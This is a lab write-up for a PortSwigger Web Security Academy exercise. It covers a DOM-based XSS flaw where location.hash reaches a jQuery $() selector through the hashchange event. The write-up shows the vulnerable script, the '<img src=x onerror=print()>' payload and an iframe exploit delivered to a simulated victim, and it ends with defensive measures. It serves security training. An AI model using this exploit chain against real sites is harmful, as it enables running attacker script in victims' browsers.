# DOM-Based XSS — jQuery Selector Sink Using a `hashchange` Event

## 1. Vulnerability

**Vulnerability:** DOM-Based Cross-Site Scripting (DOM XSS)

**Severity:** Medium

**Source:** `location.hash`

**Event:** `hashchange`

**Sink:** jQuery `$()` selector

**Affected Page:** Home page

**Final Payload:**

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

### Description

The application contains a DOM-based XSS vulnerability on the home page.

The page uses the URL fragment (`location.hash`) to determine which post should be automatically scrolled into view.

A JavaScript event handler monitors changes to the URL fragment. When the hash changes, its value is passed to jQuery's `$()` selector function.

Because attacker-controlled data eventually reaches the jQuery selector without appropriate validation, an attacker can manipulate the DOM and trigger JavaScript execution.

In this lab, the exploit is delivered through an iframe hosted on the PortSwigger exploit server.

---

# 2. Objective

The objective of this lab is to:

- Identify `location.hash` as a DOM XSS source.
- Understand the `hashchange` event.
- Identify jQuery's `$()` selector as the vulnerable sink.
- Construct an exploit that changes the victim's URL fragment.
- Trigger the vulnerable JavaScript code.
- Execute the browser's `print()` function.
- Deliver the exploit to the simulated victim through the exploit server.

---

# 3. Understand the Vulnerability

The vulnerability follows this general data flow:

```
Attacker-controlled URL fragment
          ↓
     location.hash
          ↓
     hashchange event
          ↓
      JavaScript
          ↓
      jQuery $()
          ↓
      DOM processing
          ↓
    XSS payload executes
          ↓
       print()
```

The important concepts in this lab are:

```
Source → Event → Processing → Sink → Execution
```

---

# 4. Step 1 — Open the Home Page

Open the PortSwigger lab and visit the application's **home page**.

The page contains multiple posts.

The application has functionality that automatically scrolls to a particular post based on the URL fragment.

For example:

```
https://0ac800d004fd728280eb1ccf00aa0094.web-security-academy.net/
```

---

# 5. Step 2 — Understand `location.hash`

JavaScript provides the following property:

```
location.hash
```

It represents the fragment portion of the current URL.

For example, if the URL is:

```
https://example.com/#hello
```

then:

```
location.hash
```

returns:

```
#hello
```

The important point is that the fragment is controlled by the user.

Therefore:

```
URL fragment
     ↓
location.hash
     ↓
Attacker-controlled data
```

---

# 6. Step 3 — Identify the Vulnerable jQuery Selector and Inspect `location.hash` in the Console

Write click on the web page and click Inspect(Q). The flow is:

```
**Right Click >>> Click Inspect(Q) >>> Debugger >>> Ctrl+Shift+F >>>> Search "script" >>>> Click <script>** 
```

The vulnerable jQuery Selector is :

```
</section>
                    <script src="/resources/js/jquery_1-8-2.js"></script>
                    <script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
                    <script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
```

# 7. Step 4 — Identify the `hashchange` Event and a `#` Fragment in the URL

Open the PortSwigger lab home page.

Click a post or inspect the URL after selecting a post. In below screenshot, the URL contains:

```
#I%20Wanked%20A%20Bike
```

The relevant part is:

```
#I%20Wanked%20A%20Bike
```

Here:

- `#` marks the beginning of the URL fragment.
- `%20` represents an encoded space.
- `I%20Wanked%20A%20Bike` represents the post title with encoded spaces.

The decoded post title is:

```
I Wanked A Bike
```

**Observation:** The application appears to use the URL fragment to identify a blog post.

---

Now open Developer Tools and select the **Console** tab.

### Test 1: Read the URL fragment

Enter:

```
window.location.hash
```

Press Enter.

**Expected output:**

```
"#I%20Wanked%20A%20Bike"
```

This shows the fragment exactly as it appears in the URL, including the percent-encoded spaces.

### Test 2: Decode the fragment

Now enter:

```
decodeURIComponent(window.location.hash.slice(1))
```

Press Enter.

**Expected output:**

```
"I Wanked A Bike"
```

Let's break down the expression:

| Code | Meaning |
| --- | --- |
| `window.location` | Represents the current page's location. |
| `.hash` | Retrieves the URL fragment, including `#`. |
| `.slice(1)` | Removes the first character, which is `#`. |
| `decodeURIComponent()` | Decodes percent-encoded characters such as `%20`. |

The data flow is:

```
URL
 |
 └── #I%20Wanked%20A%20Bike
                |
                ▼
      window.location.hash
                |
                ▼
      .slice(1)
                |
                ▼
       I%20Wanked%20A%20Bike
                |
                ▼
      decodeURIComponent()
                |
                ▼
        I Wanked A Bike
```

**Observation:** The fragment is accessible to JavaScript and can be decoded into a readable post title.

---

# 8. Step 5: Change the Fragment to an Attacker-Controlled Value

## 

Now test whether you can control the fragment.

Change the URL to:

```
https://YOUR-LAB-ID.web-security-academy.net/#Hi%20Honey
```

Replace `YOUR-LAB-ID` with your actual lab hostname.

Press Enter.

Alternatively, you can change the fragment from the Console:

```
window.location.hash = "Hi Honey"
```

The browser will update the URL fragment.

Now run:

```
window.location.hash
```

Expected output:

```
"#Hi%20Honey"
```

Next, run:

```
decodeURIComponent(window.location.hash.slice(1))
```

Expected output:

```
"Hi Honey"
```

**Observation:** You successfully controlled the value returned by `location.hash`.

This is an important step in identifying a possible DOM XSS source.

# 9. Step 6: Check Whether the `hashchange` Event Fires

---

Changing the fragment can trigger the browser's `hashchange` event.

To observe this, enter the following in the Console:

```
window.addEventListener("hashchange", function () {
    console.log("Hash changed!");
    console.log("Current hash:", window.location.hash);
    console.log(
        "Decoded hash:",
        decodeURIComponent(window.location.hash.slice(1))
    );
});
```

Now change the fragment again:

```
window.location.hash = "Test123"
```

You should see output similar to:

```
Hash changed!
Current hash: #Test123
Decoded hash: Test123
```

### Important distinction

This test confirms that the browser fires the `hashchange` event.

**It does not, by itself, prove that the application's vulnerable handler executed.** 

# 10. Step 7: Test the XSS Payload — `<img src=x onerror=print()>`

## 

Now that you have confirmed that the URL fragment is attacker-controlled and investigated the `hashchange` event, the next step is to test the payload used in this lab.

### 5.1 Use the Payload

The payload is:

```
<img src=x onerror=print()>
```

It contains three important components:

| Component | Explanation |
| --- | --- |
| `<img>` | Creates an HTML image element. |
| `src=x` | Attempts to load an image from the specified source. |
| `onerror=print()` | Calls the browser's `print()` function if image loading fails. |

### 5.2 Understand the Execution Flow

```
<img src=x onerror=print()>
              |
              ▼
       Browser loads image
              |
              ▼
        Image loading fails
              |
              ▼
         onerror fires
              |
              ▼
          print() runs
              |
              ▼
       Browser print dialog
```

### 5.3 Observe the Result

The screenshot below shows the browser's **Print** dialog. This indicates that `print()` was executed successfully.

However, there is an important distinction:

- **Payload execution confirmed:** The browser's print dialog appeared.

The payload has demonstrated JavaScript execution, but you must still complete the lab's exploit-delivery procedure.

# 11. Step 8 — Why Direct Exploitation Is Not Enough

A key challenge in this lab is that the attacker needs to **deliver the exploit to another user**.

Simply opening a malicious URL may demonstrate the vulnerability, but the lab specifically asks to:

> deliver an exploit to the victim
> 

Therefore, the exploit must cause the victim's browser to:

1. Load the vulnerable page.
2. Change the URL fragment.
3. Trigger the `hashchange` event.
4. Reach the vulnerable jQuery selector.
5. Execute `print()`.

This is why an iframe is used.

---

# 12. Step 9 — Open the Exploit Server

From the lab page, locate the **Exploit server** link in the lab banner.

Open it.

The **Body** field is where the malicious HTML will be placed.

---

# 13. Step 10 — Construct the iframe Exploit

Insert the following into the **Body** field:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

Change the YOUR-LAB-ID to lab one:

```
<iframe src=https://0abc003704baa96c800d03ef007700ea.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

---

# 14. Step 11 — Understand the iframe

The first part is:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#">
```

This loads the vulnerable lab page inside an iframe.

The important part is the trailing:

```
#
```

This establishes the initial fragment.

---

# 15. Step 12 — Understand the `onload` Handler

The iframe contains:

```
onload="this.src+='<img src=x onerror=print()>'"
```

The `onload` event executes when the iframe finishes loading.

The code:

```
this.src += ...
```

modifies the iframe's URL.

Initially:

```
https://YOUR-LAB-ID.web-security-academy.net/#
```

After the `onload` code executes, the URL is effectively changed to include:

```
<img src=x onerror=print()>
```

This causes the iframe's URL fragment to change.

---

# 16. Step 13 — Why the `hashchange` Event Fires

Initially, the iframe loads:

```
https://YOUR-LAB-ID.web-security-academy.net/#
```

The `onload` handler then modifies the URL:

```
#
↓
#<img src=x onerror=print()>
```

Because the fragment has changed, the browser fires:

```
hashchange
```

The vulnerable application responds to this event.

The attack chain therefore becomes:

```
iframe loads
     ↓
onload executes
     ↓
iframe.src changes
     ↓
URL hash changes
     ↓
hashchange event fires
     ↓
location.hash changes
     ↓
jQuery $() receives attacker-controlled value
     ↓
XSS
     ↓
print()
```

---

# 17. Step 14 — Understand the Injected HTML

The fragment contains:

```
<img src=x onerror=print()>
```

The important components are:

### `<img>`

Creates an image element.

### `src=x`

The browser attempts to load a resource named `x`.

Because it is not a valid image resource, the image loading fails.

### `onerror`

The `onerror` event fires when the image fails to load.

### `print()`

The browser executes:

```
print()
```

which opens the browser's print dialog.

---

# 18. Step 15 — Store the Exploit

After entering the iframe payload into the exploit server's **Body** field:

Click:

**Store**

The exploit is now saved on the exploit server.

---

# 19. Step 16 — Test the Exploit

Click:

**View exploit**

This allows you to test the exploit yourself before sending it to the simulated victim.

If successful, the browser should invoke:

```
print()
```

and display the browser's print dialog.

This confirms that the exploit is functioning.

---

# 20. Step 17 — Deliver the Exploit to the Victim

Return to the exploit server.

Click:

**Deliver to victim**

The simulated victim will visit the exploit.

The victim's browser then follows the complete attack chain:

```
Exploit Server
      ↓
Malicious iframe
      ↓
Lab Home Page
      ↓
iframe onload
      ↓
URL fragment modification
      ↓
hashchange
      ↓
location.hash
      ↓
jQuery $() selector
      ↓
Injected HTML
      ↓
onerror
      ↓
print()
```

If successful, the lab will be marked as **Solved**.

---

# 

---

# 21. Source → Sink Analysis

This is the most important part to document in your GitHub portfolio.

## Source

The attacker-controlled source is:

```
location.hash
```

The value comes from the URL fragment:

```
https://target/#ATTACKER_CONTROLLED_DATA
```

---

## Event

The application monitors:

```
hashchange
```

When the fragment changes, the vulnerable code executes.

---

## Sink

The dangerous sink is jQuery's:

```
$()
```

selector.

Conceptually:

```
$(location.hash)
```

The attacker therefore controls the data reaching the selector.

---

## Payload

The injected HTML is:

```
<img src=x onerror=print()>
```

---

# 22. Full Data Flow

```
Attacker
   │
   ▼
Exploit Server
   │
   ▼
Malicious iframe
   │
   ▼
Lab Home Page
   │
   ▼
iframe onload
   │
   ▼
Change URL fragment
   │
   ▼
hashchange event
   │
   ▼
location.hash
   │
   ▼
jQuery $() selector
   │
   ▼
Injected HTML
   │
   ▼
<img src=x onerror=print()>
   │
   ▼
Image loading fails
   │
   ▼
onerror
   │
   ▼
print()
```

---

# 23. Why Is This DOM XSS?

This is **DOM-based XSS** because the malicious input is processed by JavaScript in the browser.

The important flow is:

```
URL
 ↓
location.hash
 ↓
Client-side JavaScript
 ↓
DOM sink
 ↓
JavaScript execution
```

The server does not need to reflect the payload into the HTML response for the attack to work.

---

# 24. Impact

DOM XSS can allow an attacker to execute JavaScript in the security context of the vulnerable application.

Depending on the application's functionality, this could potentially allow:

- Modification of page content.
- Actions performed as the victim.
- Access to data exposed to JavaScript.
- Phishing within the trusted application origin.
- Interaction with application functionality using the victim's browser.
- Targeting of privileged users.

The actual impact depends on the application's security controls and the victim's privileges.

---

# 25. Defensive Measures

## 25.1 Do Not Use Untrusted Hash Values Directly as Selectors

Avoid patterns such as:

```
$(location.hash)
```

when the hash is user-controlled.

Instead, validate the fragment against an expected format.

---

## 25.2 Validate the Hash

If the application expects a post identifier, allow only valid identifiers.

For example:

```
#post-123
```

could be validated against an appropriate allowlist or expected format.

Unexpected HTML or selector syntax should be rejected.

---

## 25.3 Avoid Dangerous jQuery Selector Construction

Do not construct selectors directly from untrusted data.

Instead, safely identify the expected element using controlled identifiers and appropriate DOM APIs.

---

## 25.4 Use Safe DOM APIs

Where appropriate, prefer APIs that treat input as data rather than HTML or selectors.

For example:

```
document.getElementById(id)
```

can be preferable when the application expects a specific element ID and `id` has been appropriately validated.

---

## 25.5 Content Security Policy

Implement a strong Content Security Policy as an additional layer of defense.

For example:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP should be treated as defense in depth, not as the primary XSS defense.

---

# Therefore, when testing DOM XSS, look for:

- `location.hash`
- `location.search`
- `location.href`
- `location.pathname`
- `hashchange`
- jQuery `$()`
- `innerHTML`
- `document.write()`
- URL/DOM manipulation

Then trace the data from the **source** to the **sink**.
